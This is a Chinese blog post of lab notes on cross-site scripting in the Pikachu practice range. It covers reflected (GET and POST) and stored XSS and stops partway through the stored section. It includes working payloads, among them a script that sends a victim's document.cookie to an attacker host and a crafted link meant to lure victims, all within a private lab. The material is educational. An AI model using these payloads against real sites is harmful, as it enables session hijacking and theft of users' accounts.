@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Pikachu靶场之XSS | chickenmushroom&#39;s blog</title>
+  <meta name="description" content="Pikachu靶场之XSSXSS简介： ​    XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户   XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、盗取用cookie，甚至对主机进行远程控制 攻击流程： 1.假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中 2.当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pikachu靶场之XSS">
+<meta property="og:url" content="http://example.com/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Pikachu靶场之XSSXSS简介： ​    XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户   XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、盗取用cookie，甚至对主机进行远程控制 攻击流程： 1.假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中 2.当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128164024617.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128164057254.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128164601414.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128164727960.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128154621980.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128155347708.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128215118333.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128215151194.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128215335079.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128222814921.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128222916470.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128223138980.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128223227197.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128223351116.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128223538399.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128224142834.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128230045244.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128230444152.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211129212631252.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211129212510260.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205135450449.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205135744562.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205135807780.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205135821250.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130223657118.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130223756089.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130223903239.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130224156593.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130224455424.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211130224521976.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205140638219.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205141105893.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205141452588.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205142350687.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205142453380.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205142839238.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205143049221.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205144136933.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205144343117.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205144934627.png">
+<meta property="og:image" content="http://cr_7.gitee.io/git-hub-image/image-20211205145101476.png">
+<meta property="article:published_time" content="2021-09-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-05T06:56:16.583Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cr_7.gitee.io/git-hub-image/image-20211128164024617.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/cofess" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">chickenmushroom</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Guangzhou, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="/null" target="_blank" title="Github" ><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Weibo" ><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Twitter" ><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/null" target="_blank" title="Behance" ><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" ><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" rel="tag">PHP小项目</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a><span class="tag-list-count">17</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP%E5%B0%8F%E9%A1%B9%E7%9B%AE/" style="font-size: 13px;">PHP小项目</a> <a href="/tags/WriteUp/" style="font-size: 13.5px;">WriteUp</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 14px;">学习笔记</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/ciscn2021%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA/" class="title">ciscn2021半决赛-华南赛区</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/ciscn2021%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%A2%84%E8%B5%9B/" class="title">ciscn2021华南赛区预赛</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/SQL%E6%B3%A8%E5%85%A5/" class="title">SQL注入总结</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/docker%E5%85%A5%E9%97%A8%E5%88%B0%E9%83%A8%E7%BD%B2/" class="title">docker入门到部署</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%96%B0%E6%89%8Bweb%E5%92%8Cmisc/" class="title">攻防世界新手web和misc</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2021-11-14T16:00:00.000Z" itemprop="datePublished">2021-11-15</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <nav id="toc" class="article-toc">
+      <h3 class="toc-title">Catalogue</h3>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS"><span class="toc-number">1.</span> <span class="toc-text">Pikachu靶场之XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">攻击流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">XSS攻击类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.1.3.</span> <span class="toc-text">XSS形成原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">XSS漏洞测试流程：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-GET"><span class="toc-number">1.1.5.</span> <span class="toc-text">反射型XSS(GET)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-POST"><span class="toc-number">1.1.6.</span> <span class="toc-text">反射型XSS(POST)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">1.1.7.</span> <span class="toc-text">存储型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E5%88%A9%E7%94%A8%E7%95%99%E8%A8%80js%E8%84%9A%E6%9C%AC%EF%BC%8C%E7%9B%97%E5%8F%96cookie"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">案例一：利用留言js脚本，盗取cookie</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9Axss-%E9%92%93%E9%B1%BC"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">案例二：xss+钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E4%B8%89%EF%BC%9A%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.1.7.3.</span> <span class="toc-text">案例三：键盘记录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">1.1.8.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS-X"><span class="toc-number">1.1.9.</span> <span class="toc-text">DOM型XSS-X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E4%B9%8B%E7%9B%B2%E6%89%93"><span class="toc-number">1.1.10.</span> <span class="toc-text">XSS之盲打</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E4%B9%8B%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.11.</span> <span class="toc-text">XSS之过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E6%8D%A2%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">转换绕过思路:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">编码绕过思路:</span></a></li></ol></li></ol></li></ol></li></ol>
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-Pikachu靶场之XSS" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pikachu靶场之XSS
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/" class="article-date">
+	  <time datetime="2021-09-04T16:00:00.000Z" itemprop="datePublished">2021-09-05</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2021/09/05/Pikachu%E9%9D%B6%E5%9C%BA%E4%B9%8BXSS/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="Pikachu靶场之XSS"><a href="#Pikachu靶场之XSS" class="headerlink" title="Pikachu靶场之XSS"></a>Pikachu靶场之XSS</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><strong>简介：</strong></p>
+<p>​    XSS是一种发生在Web前端的漏洞，所以其危害的对象也主要是前端用户</p>
+<p>  XSS漏洞可以用来进行钓鱼攻击、前端js挖矿、盗取用cookie，甚至对主机进行远程控制</p>
+<h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a><strong>攻击流程：</strong></h3><blockquote>
+<p>1.假设存在漏洞的是一个论坛，攻击者将恶意的JS代码通过XSS漏洞插入到论文的某一页面中</p>
+<p>2.当用户访问这个页面时，都会执行这个恶意的JS代码，这个代码就会在用户的浏览器端执行</p>
+</blockquote>
+<h3 id="XSS攻击类型"><a href="#XSS攻击类型" class="headerlink" title="XSS攻击类型"></a><strong>XSS攻击类型</strong></h3><p>危害：存储型 &gt; 反射型 &gt; DOM型</p>
+<ul>
+<li>反射型：交互的数据一般不会被存在数据库里面，<strong>一次性</strong>，所见即所得，一般出现在查询页面等</li>
+<li>存储型：交互的数据会被存在数据库里面，<strong>永久性存储</strong>，一般出现在留言板，注册等页面</li>
+<li>DOM型：不与后台服务器产生数据交互，是一种<strong>通过DOM操作前端代码</strong>输出的时候产生的问题，<strong>一次性</strong>，也属于反射型</li>
+</ul>
+<h3 id="XSS形成原因"><a href="#XSS形成原因" class="headerlink" title="XSS形成原因"></a>XSS形成原因</h3><p><strong>主要原因是程序中输入和输出的控制不够严格</strong>，导致“精心构造”的脚本输入后，在输出到前端时被浏览器当作有效代码解析执行</p>
+<h3 id="XSS漏洞测试流程："><a href="#XSS漏洞测试流程：" class="headerlink" title="XSS漏洞测试流程："></a>XSS漏洞测试流程：</h3><ol>
+<li>在目标上找输入点，比如输入框、留言板等任何输入的地方</li>
+<li>输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理</li>
+<li>通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件（构造闭合）</li>
+<li>提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，如果成功执行则说明存在XSS漏洞</li>
+</ol>
+<p><strong>开始做题</strong></p>
+<h3 id="反射型XSS-GET"><a href="#反射型XSS-GET" class="headerlink" title="反射型XSS(GET)"></a>反射型XSS(GET)</h3><p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128164024617.png" alt="image-20211128164024617"></p>
+<p>打开开发者工具，定位代码插入位置进行分析。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128164057254.png" alt="image-20211128164057254"></p>
+<p>可以看到，我们输入的内容一字不漏得插入到<p>标签里面。这时候我们测试一下js代码，看下是否执行。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现前端对输入的字符长度做了限制，直接用F12修改一下</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128164601414.png" alt="image-20211128164601414"></p>
+<p>将我们的payload输入进去看看</p>
+<p>直接弹窗</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128164727960.png" alt="image-20211128164727960"></p>
+<p>证明是确实存在XSS漏洞</p>
+<p>那么我们应该怎么利用这个XSS漏洞呢？下面做个小实验：</p>
+<blockquote>
+<p>攻击机：192.168.177.1（windows）</p>
+<p>有XSS漏洞的服务器：192.168.79.133（ubantu）</p>
+<p>受害者：192.168.79.132（kali）</p>
+</blockquote>
+<p>环境搭建：</p>
+<blockquote>
+<p>1.在攻击机192.168.177.1上搭好Pikachu的XSS后台</p>
+<p>2.在服务器192.168.79.133搭好Pikachu靶场（我部署在9002端口）</p>
+<p>3.确保三台机器能互通</p>
+</blockquote>
+<p>攻击开始：</p>
+<p>攻击者：</p>
+<ul>
+<li>修改/pikachu-master/pkxss/xcookie/cookie.php文件，将IP地址改成有漏洞的服务器</li>
+</ul>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128154621980.png" alt="image-20211128154621980"></p>
+<ul>
+<li>cookie.php用于接受受害者的cookie并将受害者重定向到漏洞服务器的index.php页面。（模仿实际场景中的收信任的服务器）</li>
+</ul>
+<p>攻击者让受害者在有漏洞的输入框输入恶意JS代码，就可以实现攻击的目的。</p>
+<ul>
+<li><p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location = &#x27;http://192.168.177.1/pikachu-master/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>但是这又存在一个问题，如何让受害者将这些奇奇怪怪的恶意JS代码输入输入框内呢要是叫受害者自己复制这段payload输入进去，傻子才理你呢）？</p>
+<p>由于这是GET类型的XSS漏洞，我们可以直接构造一个URL诱骗受害者点击。这样更能贴近实际攻击场景</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.79.133:9002/vul/xss/xss_reflected_get.php?message=%3Cscript%3Edocument.location+%3D+%27http%3A%2F%2F192.168.177.1%2Fpikachu-master%2Fpkxss%2Fxcookie%2Fcookie.php%3Fcookie%3D%27+%2B+document.cookie%3B%3C%2Fscript%3E&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功将受害者的cookie反弹给攻击者</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128155347708.png" alt="image-20211128155347708"></p>
+<h3 id="反射型XSS-POST"><a href="#反射型XSS-POST" class="headerlink" title="反射型XSS(POST)"></a>反射型XSS(POST)</h3><p>进入post型xss界面，需要我们登录。默认账号admin 密码123456</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128215118333.png" alt="image-20211128215118333"></p>
+<p>进入之后呢，是一个输入框。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128215151194.png" alt="image-20211128215151194"></p>
+<p>这时候，我们输入的东西已经不会通过URL传入了。它是以POST的方式提交表单。我们可以抓个包分析一下数据</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128215335079.png" alt="image-20211128215335079"></p>
+<p>可以看到，我们的数据是通过信息体传递。这时候应该怎么攻击呢？</p>
+<p>攻击思路和GET型是一样的，就是让受害者在有漏洞的服务器上执行攻击者的恶意代码，将cookie反弹给攻击者的服务器。攻击者现在要想的就是：<strong>如何让受害者在不经意间在有漏洞的服务器上执行恶意代码。</strong></p>
+<p>因为这个是POST型的XSS，所以攻击者可以在自己服务器上放一个自己构造的post表单，此表单功能是重定向到受害者的信任网站的同时，自动向有漏洞的服务器提交post表单，从而将受害者反弹cookie给自己。</p>
+<p>那么，可以参考/pikachu/pkxss/xcookie路径下的post.html</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128222814921.png" alt="image-20211128222814921"></p>
+<p>当受害者点击访问攻击者服务器中的post表单后，就完成攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.177.1/pikachu-master/pkxss/xcookie/post.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128222916470.png" alt="image-20211128222916470"></p>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>  存储型XSS和反射型XSS形成的原因是一样的，不同的是存储型XSS下攻击者的可以将脚本注入到后台存储起来，构成更加持久的危害</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128223138980.png" alt="image-20211128223138980"></p>
+<p>我们试试，存不存在字符过滤</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128223227197.png" alt="image-20211128223227197"></p>
+<p>很明显，不会对输入的字符进行过滤。并且通过观察，结果长期存在，并且插入到<p>标签中。</p>
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128223351116.png" alt="image-20211128223351116"></p>
+<p>输入经典payload测试一下是否存在xss漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;chickenmushroom&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://cr_7.gitee.io/git-hub-image/image-20211128223538399.png" alt="image-20211128223538399"></p>
+<p>确实存在xss漏洞。</p>
